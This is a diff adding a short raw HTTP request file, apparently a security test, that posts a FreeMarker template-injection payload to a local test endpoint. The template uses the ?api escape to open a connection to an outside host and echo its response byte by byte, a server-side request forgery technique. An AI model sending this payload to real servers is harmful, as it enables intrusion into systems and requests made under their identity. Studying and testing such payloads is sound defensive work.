@@ -1,0 +1,17 @@
+POST /test2 HTTP/1.1
+Host: 127.0.0.1:8080
+Accept: text/html
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 348
+
+age=100&name=whoami&templateContent=
+<#assign uri=user?api.class.getResource("/").toURI()>
+<#assign input=uri?api.create("http://www.baidu.com").toURL().openConnection()>
+<#assign is=input?api.getInputStream()>
+FILE:[<#list 0..999999999 as _>
+    <#assign byte=is.read()>
+    <#if byte == -1>
+        <#break>
+    </#if>
+${byte}, </#list>]
